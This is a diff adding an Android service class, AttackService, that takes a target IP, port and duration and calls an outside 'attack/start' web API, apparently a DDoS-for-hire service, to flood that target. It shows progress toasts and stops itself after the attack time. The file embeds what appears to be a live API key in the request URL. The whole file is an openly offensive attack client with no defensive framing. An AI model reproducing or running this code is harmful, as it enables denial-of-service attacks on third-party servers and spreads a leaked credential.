@@ -1,0 +1,112 @@
+package com.mahakal.app;
+
+import android.app.Service;
+import android.content.Intent;
+import android.os.IBinder;
+import android.widget.Toast;
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
+public class AttackService extends Service {
+    private static boolean isRunning = false;
+    private Thread attackThread;
+    private String targetIP;
+    private int targetPort;
+    private int attackTime;
+
+    public static boolean isRunning() {
+        return isRunning;
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        if (intent != null) {
+            targetIP = intent.getStringExtra("ip");
+            targetPort = intent.getIntExtra("port", 0);
+            attackTime = intent.getIntExtra("time", 60);
+
+            if (targetIP != null && targetPort > 0) {
+                startAttack();
+            }
+        }
+        return START_STICKY;
+    }
+
+    private void startAttack() {
+        if (attackThread != null && attackThread.isAlive()) {
+            return;
+        }
+
+        isRunning = true;
+        attackThread = new Thread(() -> {
+            try {
+                // API URL - YAHAN APNI API KEY DALO
+                String apiUrl = "https://api.antiban.site/api/v1/attack/start?key=nk_4b4b58b6f32f661748195a94d810a09f&ip="
+                                + targetIP + "&port=" + targetPort + "&time=" + attackTime;
+
+                showToast("🚀 Starting Attack on " + targetIP + ":" + targetPort);
+
+                // API call karo
+                URL url = new URL(apiUrl);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("GET");
+                conn.setConnectTimeout(10000);
+                conn.setReadTimeout(10000);
+
+                int responseCode = conn.getResponseCode();
+                StringBuilder response = new StringBuilder();
+
+                if (responseCode == 200) {
+                    BufferedReader reader = new BufferedReader(
+                        new InputStreamReader(conn.getInputStream()));
+                    String line;
+                    while ((line = reader.readLine()) != null) {
+                        response.append(line);
+                    }
+                    reader.close();
+                    showToast("✅ Attack Sent! Response: " + response.toString());
+                } else {
+                    showToast("❌ Attack Failed! Code: " + responseCode);
+                }
+
+                conn.disconnect();
+
+                // Attack time ke liye wait karo
+                Thread.sleep(attackTime * 1000L);
+
+                // Auto stop
+                isRunning = false;
+                stopSelf();
+
+            } catch (Exception e) {
+                e.printStackTrace();
+                showToast("❌ Error: " + e.getMessage());
+                isRunning = false;
+                stopSelf();
+            }
+        });
+        attackThread.start();
+    }
+
+    private void showToast(String message) {
+        android.os.Handler handler = new android.os.Handler(getMainLooper());
+        handler.post(() -> Toast.makeText(AttackService.this, message, Toast.LENGTH_LONG).show());
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        isRunning = false;
+        if (attackThread != null) {
+            attackThread.interrupt();
+        }
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+}
